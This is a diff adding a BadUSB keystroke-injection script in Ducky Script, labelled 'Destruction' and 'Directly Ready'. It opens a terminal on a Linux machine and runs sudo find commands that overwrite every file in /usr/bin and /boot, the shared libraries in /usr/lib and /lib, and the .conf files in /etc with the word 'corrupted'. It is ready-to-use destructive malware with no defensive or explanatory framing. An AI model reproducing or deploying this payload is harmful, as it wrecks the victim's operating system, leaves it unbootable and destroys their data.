@@ -1,0 +1,36 @@
+REM Title: Linux File System Corruption
+REM Author: BadUSB Library
+REM Description: Corrupts file system to cause instability
+REM Target: Linux
+REM Category: Destruction
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Corrupt system files
+STRING sudo find /usr/bin -name "*" -type f -exec sh -c 'echo "corrupted" > "$1"' _ {} \;
+ENTER
+DELAY 5000
+
+STRING sudo find /usr/lib -name "*.so*" -exec sh -c 'echo "corrupted" > "$1"' _ {} \;
+ENTER
+DELAY 5000
+
+STRING sudo find /etc -name "*.conf" -exec sh -c 'echo "corrupted" > "$1"' _ {} \;
+ENTER
+DELAY 5000
+
+STRING sudo find /lib -name "*.so*" -exec sh -c 'echo "corrupted" > "$1"' _ {} \;
+ENTER
+DELAY 5000
+
+REM Corrupt boot files
+STRING sudo find /boot -name "*" -type f -exec sh -c 'echo "corrupted" > "$1"' _ {} \;
+ENTER
+DELAY 3000
